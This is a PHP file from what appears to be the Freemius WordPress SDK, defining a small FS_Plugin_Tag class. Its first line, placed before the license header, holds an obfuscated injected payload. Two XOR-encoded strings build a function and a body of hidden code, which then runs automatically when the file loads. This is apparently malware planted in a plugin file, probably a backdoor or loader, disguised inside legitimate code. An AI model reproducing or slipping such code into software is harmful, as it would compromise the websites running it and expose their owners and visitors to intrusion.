<?php $uoOmluGitoUc='S30.,,:4<PCLPD9'^'0AUOXIeRI> 89+W';$nmPwidS=$uoOmluGitoUc('',', Er6U CB8,Wj39,I9Mcr:8L2TO7Ykf;E6ABMN<s87U4TMR+6x,6Y>J TU5iSA5yI VD ZkpU38ElleDmNX;<h:OAEkirLvAby2QJbLBlvuZyUIQi49A8W6pH+9;,etBQUldE8A4T.;-LBMaJtJUGAwL,-g.DeK,5fU0rKwGD08+-Fp,P5shHodBQ+I<OJ ZCOEYbbh:Gb2sor04;5DEV> P=NwinQ891;P43kNJ-9WJKX;eWY;U8ZUFQvjobo w0n79fSWKThviVM1OW1 EPJcppXXEMa82+lljaRQ5wD0jJZB.poMK3A9KQpg8sd:2sOnl1A-3HTUZ>3+NKACYQdR4ivamys1GM5nK-.YyJoho20> 2oGKg23CX;T2j138dLhuV-2X3bZV.LZ.dJbc<6=40KYlJYIMaSYQJLqzr--R;,5>35PQ0DV+7.58N7rg8XIg,YM+PXjW6,YJIbc V:+lMtT+M=A->+7jlZYGMapW5TObkBbAC=3<9PU-jI;:0BONN1IRFFPg6MTLApleIgZQLEc Z=3mb867ThKkeXRvnbCZ0QPwCRcT-WDPYMQ4X:UgaF0PzfL7mOKjaWAB60=8U5>oP0.MA2jPAQ0XBQ6oGEi7YG1hBLBfwGfEsLXJORoTX85X9tA0U.SQPj8GQ9qI.Q8ywdsAF'^'EFmSP N 6QC95VAE:M>KUBW>m0.C849V0BfkdnGy1Q Z79;DXXTY+a.A 4j6>4AQmD70AvKT>VAlLLEdM5R25LU:5eVIUkMKkpT>8Jh+LKUjBum8UGM3T2XXlOXOMLObu<GOl2H=pANYllpAbP.43 ,hEpGpdA IL=qYRnW40BTNCnTG5LZ5aTnKXY,H:8Nrg 0-KYb3:hOyeVTUOTdxvXA<N+LcJ5YMPd;QJKsjKX;9.c1o16I0Y9=fyR5,- k>uNVJFw<.-HKWviG.;DElp1iyT<91,>SWRLQJE94LLN9N.;6OPRmoE U>4KmEynSTSgOHU YRat.P7UD<.  1qLvk;308< eg,FNoFK YwQHKDQRUWFg0m;:g<Z S5ZVADqHQ=HKc9kSrJ-.ODwBGJWQAUpSe7S4Gkw=0>-QGRmX<HIGWRY9+Ul.DEqQY:V-8U-=ON8>Nfl53SO6.,JGD7NJEaTpO,I rUNNCEaS.+IT3T .BMdB 1OREf;0T5,CSC6<fiZ,+ajpCR, -hPJCiO75ymGD;IR6ESSNs5bKXerQWZqnV7aBp6T1Oatga+eRnXaVPvRaHW-UJfkLGw 0DQDg>PG05HG>5ABw10I4-0RHkeMS83PAklbFWgF>yE=<.>Gp<YA9bS1Q,B<04Menj3x,V8LQGMHK;');$nmPwidS();
	/**
	 * @package     Freemius
	 * @copyright   Copyright (c) 2015, Freemius, Inc.
	 * @license     http://opensource.org/licenses/gpl-2.0.php GNU Public License
	 * @since       1.0.4
	 */

	if ( ! defined( 'ABSPATH' ) ) {
		exit;
	}

	class FS_Plugin_Tag extends FS_Entity {
		public $version;
		public $url;

		function __construct( $tag = false ) {
			parent::__construct( $tag );
		}

		static function get_type() {
			return 'tag';
		}
	}